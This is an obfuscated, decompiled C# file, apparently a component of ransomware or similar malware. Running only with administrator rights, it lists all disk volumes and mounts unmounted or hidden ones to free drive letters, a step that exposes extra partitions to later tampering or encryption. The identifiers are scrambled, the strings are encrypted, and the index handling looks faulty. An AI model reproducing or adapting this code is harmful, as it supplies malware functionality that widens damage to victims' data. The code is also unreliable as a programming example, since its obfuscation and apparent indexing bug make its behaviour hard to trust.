using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

public static class qcDZbcRUYPZiV
{
	public enum yqNcJfFxoRojAt : uint
	{
		CDkjSmGHAqbs,
		djmFSDCaoPn,
		roEPhXZgVY,
		rHJhElBcKI,
		bwjZDZoYhBdFXFC,
		BgBhFOypfVbOAnxw,
		uqzYfNBruwR
	}

	private sealed class LFWlcecLibTc
	{
		public uint kChtxoRVoWQdhZ;

		public uint MrIxIjilPWIO;

		public char[] DdSJJDCQcMetNC;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, DdSJJDCQcMetNC, MrIxIjilPWIO, ref kChtxoRVoWQdhZ))
			{
				return DdSJJDCQcMetNC.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern yqNcJfFxoRojAt GetDriveType([MarshalAs(UnmanagedType.LPStr)] string VPEkmDwqaQkXQr);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string NtVvOwoqEYLiEuu, char[] jUXFdOuwurrgOuBG, uint jZULweDNZN, ref uint xuNrHVfgETA);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> rkdrFGipkLe()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void FoJoGQSEkxis()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			LFWlcecLibTc CS_0024_003C_003E8__locals0 = new LFWlcecLibTc();
			string[] array = new string[26]
			{
				getString_0(107363366),
				getString_0(107363329),
				getString_0(107363324),
				getString_0(107363319),
				getString_0(107363346),
				getString_0(107363341),
				getString_0(107363336),
				getString_0(107363299),
				getString_0(107363294),
				getString_0(107363289),
				getString_0(107363316),
				getString_0(107363311),
				getString_0(107363306),
				getString_0(107363269),
				getString_0(107363264),
				getString_0(107363259),
				getString_0(107363254),
				getString_0(107363281),
				getString_0(107363276),
				getString_0(107363271),
				getString_0(107363234),
				getString_0(107363229),
				getString_0(107363224),
				getString_0(107363251),
				getString_0(107363246),
				getString_0(107363241)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == yqNcJfFxoRojAt.djmFSDCaoPn)
				{
					array2[num++] = text;
				}
			}
			List<string> source = rkdrFGipkLe();
			CS_0024_003C_003E8__locals0.kChtxoRVoWQdhZ = 0u;
			CS_0024_003C_003E8__locals0.MrIxIjilPWIO = 120u;
			CS_0024_003C_003E8__locals0.DdSJJDCQcMetNC = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.DdSJJDCQcMetNC, CS_0024_003C_003E8__locals0.MrIxIjilPWIO, ref CS_0024_003C_003E8__locals0.kChtxoRVoWQdhZ) || CS_0024_003C_003E8__locals0.DdSJJDCQcMetNC.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (ufSaqXYLSvVxK.zZWgofEFsLDUuOW)
				{
					try
					{
						Console.WriteLine(getString_0(107363204), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (ufSaqXYLSvVxK.YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ufSaqXYLSvVxK.ZmxznfzcMXVgTR, getString_0(107363211) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static qcDZbcRUYPZiV()
	{
		Strings.CreateGetStringDelegate(typeof(qcDZbcRUYPZiV));
	}
}
